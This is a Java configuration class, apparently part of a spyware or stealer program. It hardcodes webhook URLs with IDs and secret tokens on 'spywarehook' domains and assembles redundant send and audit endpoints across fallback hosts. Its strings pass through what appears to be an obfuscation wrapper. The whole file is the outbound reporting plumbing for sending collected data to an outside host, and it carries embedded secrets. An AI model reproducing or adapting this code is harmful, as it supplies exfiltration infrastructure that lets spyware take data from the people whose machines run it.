package noface.config;

public final class Hook {

    public static String url() {
        return S.e("https://spywarehook.org/api/webhooks/a7ab6400ee99f260/C4AaBFyc73iL6fgmQtgYzVJogIyG8Wbq");
    }

    public static String owner() {
        return S.e("https://spywarehook.org/api/webhooks/d288241408b870c0/qRRT__51qt4dBBO1xjQCiguRC_EAbz4v");
    }

    public static String ownerSend() {
        String u = owner();
        if (u == null || u.isBlank()) return null;
        if (u.contains(S.e("with_components"))) return u;
        return u + (u.contains(S.e("?")) ? "&" : S.e("?")) + S.e("with_components=true");
    }

    public static String bases() {
        return S.e("https://spywarehook.org|https://spywarehook.com");
    }

    public static boolean ready() {
        String u = url();
        return u != null && !u.isBlank() && u.contains(S.e("/api/webhooks/"));
    }

    public static String send() {
        String u = url();
        if (u == null || u.isBlank()) return u;
        if (u.contains(S.e("with_components"))) return u;
        return u + (u.contains(S.e("?")) ? "&" : S.e("?")) + S.e("with_components=true");
    }

    public static String audit() {
        String[] list = auditUrls();
        return list.length == 0 ? null : list[0];
    }

    public static String base() {
        String[] list = baseList();
        return list.length == 0 ? null : list[0];
    }

    public static String[] baseList() {
        java.util.LinkedHashSet<String> out = new java.util.LinkedHashSet<>();
        String raw = bases();
        if (raw != null && !raw.isBlank()) {
            for (String p : raw.split("\\|")) {
                String b = trimSlash(p);
                if (!b.isEmpty()) out.add(b);
            }
        }
        String primary = baseFromUrl(url());
        if (primary != null) {
            java.util.LinkedHashSet<String> ordered = new java.util.LinkedHashSet<>();
            ordered.add(primary);
            ordered.addAll(out);
            out = ordered;
        }
        return out.toArray(new String[0]);
    }

    public static String[] sendUrls() {
        String hid = hookId();
        String sec = hookSecret();
        if (hid == null || sec == null) {
            String one = send();
            return one == null || one.isBlank() ? new String[0] : new String[]{one};
        }
        String mark = S.e("/api/webhooks/");
        String q = S.e("?") + S.e("with_components=true");
        String[] bases = baseList();
        String[] urls = new String[bases.length];
        for (int i = 0; i < bases.length; i++) {
            urls[i] = bases[i] + mark + hid + "/" + sec + q;
        }
        return urls;
    }

    public static String[] auditUrls() {
        String hid = hookId();
        String sec = hookSecret();
        if (hid == null || sec == null) return new String[0];
        String mark = S.e("/api/audit/");
        String[] bases = baseList();
        String[] urls = new String[bases.length];
        for (int i = 0; i < bases.length; i++) {
            urls[i] = bases[i] + mark + hid + "/" + sec;
        }
        return urls;
    }

    public static String hookId() {
        String[] p = parts();
        return p == null ? null : p[0];
    }

    public static String hookSecret() {
        String[] p = parts();
        return p == null ? null : p[1];
    }

    private static String baseFromUrl(String u) {
        if (u == null || u.isBlank()) return null;
        String mark = S.e("/api/webhooks/");
        int i = u.indexOf(mark);
        if (i < 0) return null;
        return trimSlash(u.substring(0, i));
    }

    private static String trimSlash(String s) {
        if (s == null) return "";
        String t = s.trim();
        while (t.endsWith("/")) t = t.substring(0, t.length() - 1);
        return t;
    }

    private static String[] parts() {
        String u = url();
        if (u == null) return null;
        String mark = S.e("/api/webhooks/");
        int i = u.indexOf(mark);
        if (i < 0) return null;
        String rest = u.substring(i + mark.length());
        int q = rest.indexOf('?');
        if (q >= 0) rest = rest.substring(0, q);
        String[] bits = rest.split("/");
        if (bits.length < 2) return null;
        return new String[]{bits[0], bits[1]};
    }

    private Hook() {}
}
